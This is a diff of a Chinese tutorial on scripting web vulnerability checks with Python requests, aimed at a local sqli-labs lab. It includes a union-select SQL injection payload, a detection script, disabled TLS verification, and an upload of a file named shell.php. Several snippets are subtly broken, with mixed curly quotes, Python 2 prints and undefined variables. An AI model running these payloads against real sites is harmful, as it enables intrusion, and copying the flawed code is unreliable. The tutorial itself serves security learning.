@@ -30,8 +30,6 @@ why how what
 
 对应可以使用burp的Repeater或者Intruder模块，或者使用御剑这个工具
 
-
-
 原理也是根据一个IP地址，然后根据提供的字典，不停替换后面的字符串，再根据返回的响应值判断目标是否有那个目录，文件
 
 200:存在  
@@ -96,20 +94,20 @@ Req = requests.post()
 也可以这样：
 
 ```python
-Req = requests.request(“POST”)
+Req = requests.request("POST")
 ```
 
 首先，可以将请求路径部分赋值给 path
 
 ```python
-Path = “/confit.php”
+Path = "/confit.php"
 ```
 
 之后便是请求行的部分了，在burp中，会发现如果请求的时候没有HOST，那么访问就会失败，不过在python中，不需要刻意定义HOST。为了方便起见，可以先在burp中将请求行简化到最简单，然后放到下面的内容中：
 
 ```python
-Headers = {
-“user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0”,
+headers = {
+    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
 }
 ```
 
@@ -119,7 +117,288 @@ Headers = {
 
 **注意**：发包时，内容要最简化
 
-![&#x7B80;&#x5316;&#x540E;](../../.gitbook/assets/image%20%281081%29.png)
+![&#x7B80;&#x5316;&#x540E;](../../.gitbook/assets/image%20%281082%29.png)
+
+所以，此时的发包脚本可以这么编写：
+
+```python
+import requests
+
+headers = {
+    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
+}
+path = "/Less-2/?id=-1%20union%20select%2011111,md5(1),55555--+"
+target = "http://127.0.0.1:8008"
+url = target + path
+req = requests.get(url, headers=headers, timeout=10)
+
+print req.status_code
+print req.headers
+print req.content  (or print req.text)
+```
+
+ 为什么脚本中没有HOST字段呢？？？？  
+因为在python中，可以自带HOST，而不需要手动指定HOST，更方便了我们的使用
+
+timeout是啥？  
+在访问一些网站的时候，总会有延迟，所以会设置超时，一般设置几秒自己开心就好  
+如果是国外的网站，可能延迟会比较高，这个时候可以设置的高一些，比如30左右
+
+ 当运行代码后，你收到的可能是这样的：
+
+```javascript
+200
+{"Date": "Thu, 22 Apr 2021 03:16:33 GMT","Server": "Apache/2.4.7 (Ubuntu)","X-Powered-By": "PHP/5.5.9-1ubuntu4.13","Vary": "Accept-Encoding","Content-Length": "750","Content-Type": "text/html"}
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Less-2 **Error Based- Intiger**</title>
+</head>
+<body bgcolor="#000000">
+<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
+<font size="3" color="#FFFF00">
+<font size='5' color= '#99FF00'>Your Login name:c4ca4238a0b923820dcc509a6f75849b<br>Your Password:55555</font>
+</font> </div></br></br></br><center>
+<img src="../images/Less-2.jpg" /></center>
+</body>
+</html>
+```
+
+而在burpsuite的显示中，是这个样子的：
+
+```yaml
+HTTP/1.1 200 OK
+Date: Thu, 22 Apr 2021 03:16:33 GMT
+Server: Apache/2.4.7 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.13
+Vary: Accept-Encoding
+Content-Length: 750
+Content-Type: text/html
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Less-2 **Error Based- Intiger**</title>
+</head>
+
+<body bgcolor="#000000">
+
+<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
+<font size="3" color="#FFFF00">
+
+<font size='5' color= '#99FF00'>Your Login name:c4ca4238a0b923820dcc509a6f75849b<br>Your Password:55555</font>
+
+</font> </div></br></br></br><center>
+<img src="../images/Less-2.jpg" /></center>
+</body>
+</html>
+```
+
+上述请求中，只是根据一个SQL注入，简单查询了1的MD5值，此时，返回包中的较为明显的特征值有：
+
+```text
+HTTP/1.1 200 OK    # 返回值为200
+c4ca4238a0b923820dcc509a6f75849b    # 1的MD5值
+```
+
+那么此时，脚本可以使用 `try-except`组合与`if-else`组合来编写：
+
+```python
+import requests
+
+headers = {
+    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
+}
+path = "/Less-2/?id=-1%20union%20select%2011111,md5(1),55555--+"
+target = "http://127.0.0.1:8008"
+url = target + path
+try:
+    req = requests.get(url, headers=headers, timeout=10)
+    if req.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in req.text:
+        print "漏洞存在"
+except exception as e:
+    print str(e)
+    print "漏洞不存在"
+
+```
+
+###  2，HTTPS
+
+ 当我使用浏览器访问一个以HTTPS开头的网页时，浏览器总会出现一些想让我手点的地方，比如“接受风险并继续”
+
+![](../../.gitbook/assets/image%20%281081%29.png)
+
+那么在python中，我应该怎么做呢？
+
+在1中的代码基础上，只需要添加一个字段，再多写两行代码就行，代码如下：
+
+```python
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+headers = {
+    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
+}
+path = "/Less-2/?id=-1%20union%20select%2011111,md5(1),55555--+"
+target = "http://127.0.0.1:8008"
+url = target + path
+req = requests.get(url, headers=headers, timeout=10, verify=False)
+
+print req.status_code
+print req.headers
+print req.content  (or print req.text)
+```
+
+ 我只关闭认证，使用 verify=False ,那么就会得到下面的报错：
+
+```text
+InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. 
+See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+```
+
+ 所以，需要添加两行代码，大意即为禁用安全请求警告：
+
+```python
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+```
+
+此时，上面的代码就可以直接访问页面了
+
+### 3，302跳转
+
+ 一般在浏览器上，最常见的是在登录框附近，当输入账号与密码后，会直接跳转至后台，而在burpsuite中，则会显示成这样：
+
+![burp&#x622A;&#x56FE;](../../.gitbook/assets/image%20%281083%29.png)
+
+ 而当上面例子中的代码执行的时候，还是会自动跳转到原来应该跳转到的页面，这个时候如果想让回显为302，那么应该在请求的段中添加如下代码：
+
+```python
+req = requests.post(url, headers=headers, timeout=10, verify=False, allow_redirects=False)
+# allow_redirects=False ,设置不自动跳转
+```
+
+### 4，POST方式提交信息
+
+POST方式提交信息时，可直接定义字段，并在requests方法中赋值给data即可，如下：
+
+```python
+data = "username=admin&passwd=admin"
+req = requests.post(url, headers=headers, data=data, timeout=10, verify=False, allow_redirects=False)
+```
+
+### 5，文件上传
+
+ 在burp抓包时，通常可见到文件上传的时候，都是使用POST形式上传的，而市面上的大部分脚本都是用POST方式直接将Body体放到了一个字段中，看起来比较麻烦
+
+```text
+POST /jars/upload HTTP/1.1
+Connection: close
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
+Host: IP:PORT
+Content-Type: multipart/form-data; boundary=------16403e4608fad6cc1cd8321b8b7d7f22
+Content-Length: 181
+
+--16403e4608fad6cc1cd8321b8b7d7f22
+Content-Disposition: form-data; name="jarfile"; filename="1.txt"
+
+Hello Requests.
+--16403e4608fad6cc1cd8321b8b7d7f22--
+```
+
+ 部分脚本示例：其中，还在脚本的headers头中定义了boundray，并且在文本中添加了\r\n作为回车代替，看起来不简洁
+
+```python
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+headers = {
+    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
+    "Content-Type": "multipart/form-data; boundary=------16403e4608fad6cc1cd8321b8b7d7f22"
+}
+data = "--16403e4608fad6cc1cd8321b8b7d7f22\r\nContent-Disposition: form-data; name=\"jarfile\"; filename=\"1.txt\"\r\n\r\nHello Requests.\r\n--16403e4608fad6cc1cd8321b8b7d7f22--"
+path = "/jars/upload"
+target = "http://127.0.0.1:8008"
+url = target + path
+req = requests.post(url, headers=headers, data=data, timeout=10, verify=False)
+```
+
+ 其实，当文件上传时，请求行中的content-type字段并不需要特别定制，后面的boundray也是。此时，脚本可以这样编写：
+
+```python
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+headers = {
+    "user-agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
+}
+path = "/jars/upload"
+target = "http://127.0.0.1:8008"
+file = {
+    # 'name': ('filename', u'文件内容', u'文件自定义Content-Type'),
+    'file[]': ('shell.php', data, 'application/octet-stream'),
+    'name2': (None, 'huan'),
+    None: ('haha', 'ni'),
+    None: ('xixi', 'ya'),
+        }
+url = target + path
+req = requests.get(url, headers=headers, files=file, timeout=10, verify=False)
+```
+
+![&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x53CA;&#x663E;&#x793A;&#x6548;&#x679C;](../../.gitbook/assets/image%20%281074%29.png)
+
+### 6，巧用随机数
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -391,8 +670,6 @@ if req.status_code == 400:
 
 {% tab title="分段" %}
 当文件上传遇到分段传输：
-
-![&#x793A;&#x4F8B;&#x4EE3;&#x7801;](../../.gitbook/assets/image%20%281074%29.png)
 
 相关代码示例如下：
 
